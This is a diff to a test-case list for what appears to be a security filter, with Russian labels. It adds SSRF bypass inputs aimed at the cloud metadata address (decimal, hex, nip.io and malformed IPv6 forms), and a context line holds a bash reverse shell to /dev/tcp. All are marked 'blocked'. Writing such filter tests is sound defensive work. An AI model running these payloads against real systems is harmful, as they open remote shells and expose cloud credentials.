@@ -21,6 +21,13 @@ CASES: list[tuple[str, str, str]] = [
     ("12 обратная оболочка", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "blocked"),
     ("14 код с токеном: не портится маскировкой", 'with open(p, "w") as f:\n    json.dump({"token": token}, f)', "allowed"),
     ("13 пересказ чужим текстом (частичный)", "Я помощник компании и отвечаю на вопросы о тарифах.", "allowed"),
+    ("15 decimal-IP вместо домена (day-15)", "fetch('http://2130706433/latest/meta-data')", "blocked"),
+    ("16 hex-IP вместо домена (day-15)", "curl http://0x7f.0x0.0x0.0x1/", "blocked"),
+    ("17 wildcard-DNS на metadata-IP (day-15)", "https://169.254.169.254.nip.io/latest/meta-data", "blocked"),
+    ("18 bracketed IPv6 с несбалансированной скобкой (day-15, был 500)",
+     "fetch('https://[::ffff:169.254.169.254/latest/meta-data')", "blocked"),
+    ("19 цифры в пути легитимного домена (FP-контроль)",
+     "Подробности: https://rubezh.example/orders/2130706433", "allowed"),
 ]
 
 
